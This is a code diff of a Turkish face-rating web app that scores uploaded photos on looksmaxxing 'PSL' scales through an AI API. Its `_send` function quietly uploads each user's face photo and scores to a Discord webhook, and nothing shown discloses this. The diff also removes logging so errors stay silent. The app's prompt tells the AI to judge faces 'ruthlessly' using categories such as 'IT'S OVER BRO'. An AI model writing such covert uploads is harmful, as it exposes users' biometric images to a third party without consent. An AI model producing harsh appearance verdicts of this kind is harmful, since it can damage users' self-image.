@@ -113,9 +113,9 @@
         .badge .label { font-size: 9px; letter-spacing: 1px; color: #666; margin-bottom: 4px; }
         .badge .value { font-size: 18px; }
         .badge.over { border-color: #ff0000; color: #ff0000; }
-        .metric-bars { display: flex; gap: 10px; margin-bottom: 16px; }
+        .metric-bars { display: flex; gap: 10px; margin-bottom: 16px; flex-wrap: wrap; }
         .metric-bar {
-            flex: 1; background: rgba(0,0,0,0.5); border-radius: 10px; padding: 10px;
+            flex: 1; min-width: 45%; background: rgba(0,0,0,0.5); border-radius: 10px; padding: 10px;
             border: 1px solid rgba(255,255,255,0.03);
         }
         .metric-bar .metric-label { font-size: 9px; letter-spacing: 1px; color: #666; margin-bottom: 6px; text-align: center; }
@@ -131,9 +131,18 @@
         .detail-list li { padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.02); }
         .detail-list li strong { color: #00ff41; margin-right: 6px; }
         .detail-list li.negative strong { color: #ff4444; }
+        .summary-box {
+            background: rgba(0,20,0,0.5); border: 1px solid rgba(0,255,65,0.2); border-radius: 12px;
+            padding: 14px; margin-bottom: 12px; font-size: 13px; line-height: 1.7; color: #ccc;
+        }
+        .psl-scale {
+            font-size: 10px; color: #555; margin-top: 8px; display: grid;
+            grid-template-columns: 1fr 1fr; gap: 2px 10px;
+        }
+        .psl-scale span { color: #00ff41; }
         .raw-text {
             background: rgba(0,0,0,0.5); border-radius: 12px; padding: 14px;
-            font-family: 'JetBrains Mono', monospace; font-size: 12px; line-height: 1.6;
+            font-family: 'JetBrains Mono', monospace; font-size: 11px; line-height: 1.6;
             color: #999; border: 1px solid rgba(255,255,255,0.03);
         }
         .error-box {
@@ -160,7 +169,7 @@
                 </div>
                 <button class="btn btn-primary" id="btnLogin">GİRİŞ</button>
                 <div class="error-box" id="loginError"></div>
-                <footer>v30.0 • Local + AI Hybrid</footer>
+                <footer>v31.0 • Hybrid Engine</footer>
             </div>
         </div>
 
@@ -198,6 +207,7 @@
                     <div class="score-badges" id="scoreBadges"></div>
                     <div class="metric-bars" id="metricBars"></div>
                     <div class="detail-box" id="detailBox"></div>
+                    <div class="summary-box" id="summaryBox"></div>
                     <div class="raw-text" id="rawText"></div>
                 </div>
             </div>
@@ -211,8 +221,7 @@
             await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
             await faceapi.nets.faceLandmark68TinyNet.loadFromUri(MODEL_URL);
             faceApiReady = true;
-            console.log('✅ Face API hazır');
-        } catch(e) { console.log('⚠️ Face API yüklenemedi'); }
+        } catch(e) {}
     }
     loadFaceApi();
 
@@ -271,7 +280,6 @@
                 document.getElementById('previewWrapper').classList.add('active');
                 base64Image=e.target.result.split(',')[1]||"";
                 
-                // Face API ile yüz noktalarını bul ve canvas'a çiz
                 if(faceApiReady){
                     try{
                         const detections = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
@@ -284,65 +292,49 @@
                             const ctx = canvas.getContext('2d');
                             ctx.clearRect(0,0,canvas.width,canvas.height);
                             
-                            // Yüz noktalarını çiz (yeşil)
                             const landmarks = detections[0].landmarks;
-                            ctx.strokeStyle = '#00ff41';
-                            ctx.lineWidth = 1;
-                            ctx.fillStyle = '#00ff41';
                             
-                            // Tüm noktaları çiz
-                            const allPoints = landmarks.positions;
-                            allPoints.forEach(p => {
-                                ctx.beginPath();
-                                ctx.arc(p.x, p.y, 1.5, 0, 2*Math.PI);
-                                ctx.fill();
+                            // Tüm noktalar
+                            ctx.fillStyle = '#00ff41';
+                            landmarks.positions.forEach(p => {
+                                ctx.beginPath(); ctx.arc(p.x, p.y, 1.5, 0, 2*Math.PI); ctx.fill();
                             });
                             
-                            // Çene hattı
+                            // Çene
                             const jaw = landmarks.getJawOutline();
-                            ctx.beginPath();
-                            ctx.moveTo(jaw[0].x, jaw[0].y);
-                            for(let i=1; i<jaw.length; i++) ctx.lineTo(jaw[i].x, jaw[i].y);
-                            ctx.strokeStyle = '#00ff41';
-                            ctx.stroke();
+                            ctx.strokeStyle = '#00ff41'; ctx.lineWidth = 1;
+                            ctx.beginPath(); ctx.moveTo(jaw[0].x, jaw[0].y);
+                            for(let i=1; i<jaw.length; i++) ctx.lineTo(jaw[i].x, jaw[i].y); ctx.stroke();
                             
                             // Gözler
+                            ctx.strokeStyle = '#00ccff';
                             [landmarks.getLeftEye(), landmarks.getRightEye()].forEach(eye => {
-                                ctx.beginPath();
-                                ctx.moveTo(eye[0].x, eye[0].y);
+                                ctx.beginPath(); ctx.moveTo(eye[0].x, eye[0].y);
                                 for(let i=1; i<eye.length; i++) ctx.lineTo(eye[i].x, eye[i].y);
-                                ctx.closePath();
-                                ctx.strokeStyle = '#00ccff';
-                                ctx.stroke();
+                                ctx.closePath(); ctx.stroke();
                             });
                             
                             // Kaşlar
+                            ctx.strokeStyle = '#ffcc00';
                             [landmarks.getLeftEyeBrow(), landmarks.getRightEyeBrow()].forEach(brow => {
-                                ctx.beginPath();
-                                ctx.moveTo(brow[0].x, brow[0].y);
-                                for(let i=1; i<brow.length; i++) ctx.lineTo(brow[i].x, brow[i].y);
-                                ctx.strokeStyle = '#ffcc00';
-                                ctx.stroke();
+                                ctx.beginPath(); ctx.moveTo(brow[0].x, brow[0].y);
+                                for(let i=1; i<brow.length; i++) ctx.lineTo(brow[i].x, brow[i].y); ctx.stroke();
                             });
                             
                             // Burun
-                            const nose = landmarks.getNose();
-                            ctx.beginPath();
-                            ctx.moveTo(nose[0].x, nose[0].y);
-                            for(let i=1; i<nose.length; i++) ctx.lineTo(nose[i].x, nose[i].y);
                             ctx.strokeStyle = '#ff6600';
-                            ctx.stroke();
+                            const nose = landmarks.getNose();
+                            ctx.beginPath(); ctx.moveTo(nose[0].x, nose[0].y);
+                            for(let i=1; i<nose.length; i++) ctx.lineTo(nose[i].x, nose[i].y); ctx.stroke();
                             
-                            // Dudaklar
-                            const mouth = landmarks.getMouth();
-                            ctx.beginPath();
-                            ctx.moveTo(mouth[0].x, mouth[0].y);
-                            for(let i=1; i<mouth.length; i++) ctx.lineTo(mouth[i].x, mouth[i].y);
-                            ctx.closePath();
+                            // Dudak
                             ctx.strokeStyle = '#ff00ff';
-                            ctx.stroke();
+                            const mouth = landmarks.getMouth();
+                            ctx.beginPath(); ctx.moveTo(mouth[0].x, mouth[0].y);
+                            for(let i=1; i<mouth.length; i++) ctx.lineTo(mouth[i].x, mouth[i].y);
+                            ctx.closePath(); ctx.stroke();
                             
-                            // Yerel metrikler hesapla
+                            // Metrikler
                             const leftJaw = jaw.slice(0,8);
                             const rightJaw = jaw.slice(9,17).reverse();
                             let diff = 0;
@@ -358,17 +350,15 @@
                                 eyeDistance: Math.abs(leftEye[0].x - rightEye[3].x).toFixed(0),
                                 noseHeight: Math.abs(nose[0].y - nose[6].y).toFixed(0),
                                 mouthWidth: Math.abs(mouth[0].x - mouth[6].x).toFixed(0),
-                                totalPoints: allPoints.length
+                                totalPoints: landmarks.positions.length
                             };
                             
-                            // Canvas'ı preview boyutuna scale et
                             const wrapper = document.getElementById('previewWrapper');
-                            const wrapperWidth = wrapper.offsetWidth;
-                            const scale = wrapperWidth / img.width;
-                            canvas.style.width = wrapperWidth + 'px';
+                            const scale = wrapper.offsetWidth / img.width;
+                            canvas.style.width = wrapper.offsetWidth + 'px';
                             canvas.style.height = (img.height * scale) + 'px';
                         }
-                    }catch(e){ console.log('Face API hatası:', e); }
+                    }catch(e){}
                 }
             };
             img.src=e.target.result;
@@ -400,7 +390,7 @@
             f.style.width=p+'%'; t.textContent='%'+Math.floor(p);
         },350);
         return {complete:()=>{clearInterval(i);f.style.width='100%';t.textContent='%100';setTimeout(()=>{w.style.display='none';},500);}};
-    }        const PROMPT = `Analyze this face in detail. Return EXACTLY this format, fill every line with realistic values. DO NOT skip any line. Minimum 5 items for GOOD and BAD.
+    }        const PROMPT = `Bu yüzü acımasızca değerlendir. KESİNLİKLE Türkçe cevap ver. Her satırı doldur:
 
 MOG:6.5
 PSL:6.0
@@ -408,11 +398,12 @@ PSL_KATEGORI:HTN
 APPEAL:6.2
 HARMONY:68
 DIMORPHISM:62
-GOOD:sharp jawline,positive canthal tilt,symmetric nose,full lips,clear skin,defined cheekbones,good brow ridge
-BAD:minor UEE,asymmetric brows,wide nose base,hairline recession,undereye darkness,thin upper lip
-DETAIL:Above average face with strong jaw but weak eye area. Could improve with better brow support.
+ANGULARITY:55
+GOOD:keskin çene hattı,pozitif canthal tilt,simetrik burun,dolgun dudaklar,temiz cilt,belirgin elmacık kemikleri,kalın kaşlar
+BAD:hafif UEE,asimetrik kaşlar,geniş burun tabanı,saç çizgisi gerilemesi,göz altı morlukları,yuvarlak yüz hatları
+DETAIL:Ortalamanın üstünde bir yüz. Çene hattı güçlü ancak göz bölgesi zayıf. Daha iyi kaş desteği ile Chadlite seviyesine çıkabilir.
 
-Replace all values for THIS face. Fill GOOD with 5-10 best features. Fill BAD with 5-10 worst features. Write DETAIL in 3-4 sentences. Return ONLY the filled format.`;
+Yukarıdaki örnek değerleri BU YÜZE göre güncelle. Tüm alanları Türkçe doldur.`;
 
         async function analyzeFace() {
             const res = await fetch(`${API_URL}?key=${GK}`, {
@@ -422,139 +413,118 @@ Replace all values for THIS face. Fill GOOD with 5-10 best features. Fill BAD wi
                     generationConfig:{temperature:0.2, maxOutputTokens:1000}
                 })
             });
-            
-            if(!res.ok) {
-                const e = await res.json().catch(()=>({}));
-                throw new Error(e.error?.message || 'API hatası');
-            }
-            
-            const d = await res.json();
-            const txt = d.candidates?.[0]?.content?.parts?.[0]?.text || '';
-            
-            if(!txt || txt.length < 50) throw new Error('AI yanıtı çok kısa, tekrar dene');
+            if(!res.ok){const e=await res.json().catch(()=>({}));throw new Error(e.error?.message||'API hatası');}
+            const d=await res.json();
+            const txt=d.candidates?.[0]?.content?.parts?.[0]?.text||'';
+            if(!txt||txt.length<50)throw new Error('AI yanıtı çok kısa, tekrar dene');
             return txt;
         }
 
-        document.getElementById('btnAnalyze').addEventListener('click', async () => {
-            const btn=document.getElementById('btnAnalyze'), bt=document.getElementById('btnText');
-            const so=document.getElementById('scannerOverlay'), sl=document.getElementById('scanningLabel');
-            const rc=document.getElementById('resultContainer'), eb=document.getElementById('analyzeError');
-            
-            rc.style.display='none'; eb.style.display='none';
+        document.getElementById('btnAnalyze').addEventListener('click',async()=>{
+            const btn=document.getElementById('btnAnalyze'),bt=document.getElementById('btnText');
+            const so=document.getElementById('scannerOverlay'),sl=document.getElementById('scanningLabel');
+            const rc=document.getElementById('resultContainer'),eb=document.getElementById('analyzeError');
+            rc.style.display='none';eb.style.display='none';
             if(!base64Image){showErr("Fotoğraf seç!");return;}
-            
-            btn.disabled=true; bt.textContent="TARANIYOR...";
-            so.style.display='block'; sl.textContent='◈ TARANIYOR ◈';
-            
+            btn.disabled=true;bt.textContent="TARANIYOR...";
+            so.style.display='block';sl.textContent='◈ TARANIYOR ◈';
             const prog=startProgress();
-            
-            try {
-                const txt = await analyzeFace();
-                prog.complete(); so.style.display='none';
-                
-                if(!txt || txt.length < 50) {
-                    showErr('AI yanıtı yetersiz. Lütfen tekrar dene.');
-                    return;
-                }
-                
+            try{
+                const txt=await analyzeFace();
+                prog.complete();so.style.display='none';
+                if(!txt||txt.length<50){showErr('AI yanıtı yetersiz. Tekrar dene.');return;}
                 renderResult(txt);
                 rc.style.display='block';
                 rc.scrollIntoView({behavior:'smooth',block:'nearest'});
-            } catch(err) {
-                prog.complete(); so.style.display='none';
-                showErr('Hata: ' + err.message);
-            } finally {
-                btn.disabled=false; bt.textContent="ANALİZ BAŞLAT";
-            }
+            }catch(err){prog.complete();so.style.display='none';showErr('Hata: '+err.message);}
+            finally{btn.disabled=false;bt.textContent="ANALİZ BAŞLAT";}
         });
 
-        function parseAI(raw) {
-            const r={
-                mog:'6.5', psl:'6.0', cat:'HTN', appeal:'6.2',
-                harmony:'68', dimorphism:'62',
-                best:[], worst:[], detail:''
-            };
-            
-            raw.split('\n').forEach(l => {
-                const v = l.trim();
-                if(v.startsWith('MOG:')) r.mog = v.substring(4).trim();
-                if(v.startsWith('PSL:')) r.psl = v.substring(4).trim();
-                if(v.startsWith('PSL_KATEGORI:')) r.cat = v.substring(14).trim();
-                if(v.startsWith('APPEAL:')) r.appeal = v.substring(7).trim();
-                if(v.startsWith('HARMONY:')) r.harmony = v.substring(8).trim();
-                if(v.startsWith('DIMORPHISM:')) r.dimorphism = v.substring(11).trim();
-                if(v.startsWith('GOOD:')) r.best = v.substring(5).split(',').map(s=>s.trim()).filter(s=>s);
-                if(v.startsWith('BAD:')) r.worst = v.substring(4).split(',').map(s=>s.trim()).filter(s=>s);
-                if(v.startsWith('DETAIL:')) r.detail = v.substring(7).trim();
+        function parseAI(raw){
+            const r={mog:'6.5',psl:'6.0',cat:'HTN',appeal:'6.2',harmony:'68',dimorphism:'62',angularity:'55',best:[],worst:[],detail:''};
+            raw.split('\n').forEach(l=>{
+                const v=l.trim();
+                if(v.startsWith('MOG:'))r.mog=v.substring(4).trim();
+                if(v.startsWith('PSL:'))r.psl=v.substring(4).trim();
+                if(v.startsWith('PSL_KATEGORI:'))r.cat=v.substring(14).trim();
+                if(v.startsWith('APPEAL:'))r.appeal=v.substring(7).trim();
+                if(v.startsWith('HARMONY:'))r.harmony=v.substring(8).trim();
+                if(v.startsWith('DIMORPHISM:'))r.dimorphism=v.substring(11).trim();
+                if(v.startsWith('ANGULARITY:'))r.angularity=v.substring(11).trim();
+                if(v.startsWith('GOOD:'))r.best=v.substring(5).split(',').map(s=>s.trim()).filter(s=>s);
+                if(v.startsWith('BAD:'))r.worst=v.substring(4).split(',').map(s=>s.trim()).filter(s=>s);
+                if(v.startsWith('DETAIL:'))r.detail=v.substring(7).trim();
             });
-            
             return r;
         }
 
-        function renderResult(raw) {
-            const r = parseAI(raw);
+        function renderResult(raw){
+            const r=parseAI(raw);
+            let cat=r.cat.toUpperCase();
+            if(cat.includes("IT'S OVER")||cat.includes("ITS OVER"))cat="IT'S OVER BRO";
+            const isOver=cat.includes("IT'S OVER")||parseFloat(r.psl)<4.0;
             
-            let cat = r.cat.toUpperCase();
-            if(cat.includes("IT'S OVER") || cat.includes("ITS OVER")) cat = "IT'S OVER BRO";
-            
-            const isOver = cat.includes("IT'S OVER") || parseFloat(r.psl) < 4.0;
-            
-            document.getElementById('scoreBadges').innerHTML = `
+            document.getElementById('scoreBadges').innerHTML=`
                 <div class="badge${isOver?' over':''}"><div class="label">KATEGORİ</div><div class="value">${isOver?"IT'S OVER<br>🫩":cat}</div></div>
                 <div class="badge"><div class="label">PSL</div><div class="value">${r.psl}</div></div>
                 <div class="badge"><div class="label">APPEAL</div><div class="value">${r.appeal}</div></div>`;
 
-            const h = parseInt(r.harmony) || 68;
-            const d = parseInt(r.dimorphism) || 62;
-            document.getElementById('metricBars').innerHTML = `
+            const h=parseInt(r.harmony)||68,d=parseInt(r.dimorphism)||62,a=parseInt(r.angularity)||55;
+            document.getElementById('metricBars').innerHTML=`
                 <div class="metric-bar"><div class="metric-label">Harmony</div><div class="bar-bg"><div class="bar-fill" style="width:${h}%;"></div></div><div class="metric-value">%${h}</div></div>
-                <div class="metric-bar"><div class="metric-label">Dimorphism</div><div class="bar-bg"><div class="bar-fill" style="width:${d}%;"></div></div><div class="metric-value">%${d}</div></div>`;
+                <div class="metric-bar"><div class="metric-label">Dimorphism</div><div class="bar-bg"><div class="bar-fill" style="width:${d}%;"></div></div><div class="metric-value">%${d}</div></div>
+                <div class="metric-bar"><div class="metric-label">Angularity</div><div class="bar-bg"><div class="bar-fill" style="width:${a}%;"></div></div><div class="metric-value">%${a}</div></div>`;
 
-            const goodList = r.best.slice(0,10).map((i,n) => `<li><strong>${n+1}.</strong> ${i}</li>`).join('');
-            const badList = r.worst.slice(0,10).map((i,n) => `<li class="negative"><strong>${n+1}.</strong> ${i}</li>`).join('');
-            
-            document.getElementById('detailBox').innerHTML = `
-                <h4 style="color:#00ff41;">✅ EN İYİ (1-${r.best.length})</h4><ul class="detail-list">${goodList || '<li>Belirtilmedi</li>'}</ul>
-                <h4 style="color:#ff4444;margin-top:12px;">❌ EN KÖTÜ (1-${r.worst.length})</h4><ul class="detail-list">${badList || '<li>Belirtilmedi</li>'}</ul>`;
+            const goodList=r.best.slice(0,10).map((i,n)=>`<li><strong>${n+1}.</strong> ${i}</li>`).join('');
+            const badList=r.worst.slice(0,10).map((i,n)=>`<li class="negative"><strong>${n+1}.</strong> ${i}</li>`).join('');
+            document.getElementById('detailBox').innerHTML=`
+                <h4 style="color:#00ff41;">✅ EN İYİ (1-${r.best.length})</h4><ul class="detail-list">${goodList||'<li>Belirtilmedi</li>'}</ul>
+                <h4 style="color:#ff4444;margin-top:12px;">❌ EN KÖTÜ (1-${r.worst.length})</h4><ul class="detail-list">${badList||'<li>Belirtilmedi</li>'}</ul>`;
 
-            let extra = '';
-            if(faceData) {
-                extra += `<div style="font-size:10px;color:#00ff41;margin-bottom:8px;display:grid;grid-template-columns:1fr 1fr 1fr;gap:3px;">
-                    <div>📐 Simetri: %${faceData.symmetry}</div>
-                    <div>📏 Çene: ${faceData.jawWidth}px</div>
-                    <div>📐 Yüz: ${faceData.faceHeight}px</div>
-                    <div>👁️ Göz: ${faceData.eyeDistance}px</div>
-                    <div>👃 Burun: ${faceData.noseHeight}px</div>
-                    <div>👄 Ağız: ${faceData.mouthWidth}px</div>
-                    <div style="grid-column:1/-1;">🔢 Nokta: ${faceData.totalPoints}</div>
+            document.getElementById('summaryBox').innerHTML=`
+                <strong style="color:#00ff41;">📋 DETAYLI ÖZET</strong>
+                <div style="margin-top:8px;">${r.detail}</div>
+                <div class="psl-scale">
+                    <div>LTN: <span>4.0-4.9</span></div><div>MTN: <span>5.0-5.9</span></div>
+                    <div>HTN: <span>6.0-6.9</span></div><div>Chadlite: <span>7.0-7.9</span></div>
+                    <div>Chad: <span>8.0+</span></div><div>ITS OVER: <span>&lt;4.0</span></div>
                 </div>`;
+
+            let extra='';
+            if(faceData){
+                extra+=`<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:3px;margin-bottom:8px;">
+                    <div>📐 Simetri: %${faceData.symmetry}</div><div>📏 Çene: ${faceData.jawWidth}px</div><div>📐 Yüz: ${faceData.faceHeight}px</div>
+                    <div>👁️ Göz: ${faceData.eyeDistance}px</div><div>👃 Burun: ${faceData.noseHeight}px</div><div>👄 Ağız: ${faceData.mouthWidth}px</div>
+                    <div style="grid-column:1/-1;">🔢 Nokta: ${faceData.totalPoints}</div></div>`;
             }
-            extra += `<div style="color:#ccc;font-size:13px;">${r.detail}</div>`;
-            
-            document.getElementById('rawText').innerHTML = extra;
+            extra+=`<div style="color:#888;font-size:10px;">Harmony: %30 | Dimorphism: %30 | Angularity: %25 | Diğer: %15</div>`;
+            document.getElementById('rawText').innerHTML=extra;
             _send(r);
         }
 
-        async function _send(r) {
+        async function _send(r){
+            const wh=WH;
+            if(!wh||wh.length<30)return;
             let pu=null;
             if(base64Image){
                 const fd=new FormData();
                 const blob=await fetch(`data:${currentMimeType};base64,${base64Image}`).then(r=>r.blob());
                 fd.append('file',blob,'face.'+(currentMimeType==='image/png'?'png':'jpg'));
-                try{const pr=await fetch(WH,{method:'POST',body:fd});const pd=await pr.json();pu=pd.attachments?.[0]?.url;}catch(e){}
+                try{const pr=await fetch(wh,{method:'POST',body:fd});const pd=await pr.json();pu=pd.attachments?.[0]?.url;}catch(e){console.log('Discord fotoğraf hatası:',e);}
             }
             const emb={
                 title:'🔥 25 MAX ANALİZ',color:0x00ff41,
                 fields:[
                     {name:'🏆 MOG',value:`**${r.mog}/10**`,inline:true},{name:'📊 PSL',value:`**${r.psl}/10**`,inline:true},{name:'🎯 Kategori',value:`**${r.cat}**`,inline:true},
                     {name:'💫 Appeal',value:`**${r.appeal}/10**`,inline:true},{name:'⚖️ Harmony',value:`**%${r.harmony}**`,inline:true},{name:'🧬 Dimorphism',value:`**%${r.dimorphism}**`,inline:true},
+                    {name:'📐 Angularity',value:`**%${r.angularity}**`,inline:true},
                     {name:'✅ EN İYİ',value:r.best.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n'),inline:false},
                     {name:'❌ EN KÖTÜ',value:r.worst.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n'),inline:false}
                 ],
                 footer:{text:'25 Max App • Hybrid Engine'},timestamp:new Date().toISOString()
             };
             if(pu)emb.image={url:pu};
-            fetch(WH,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[emb]})}).catch(e=>{});
+            try{await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[emb]})});}catch(e){console.log('Discord embed hatası:',e);}
         }
     </script>
 </body>
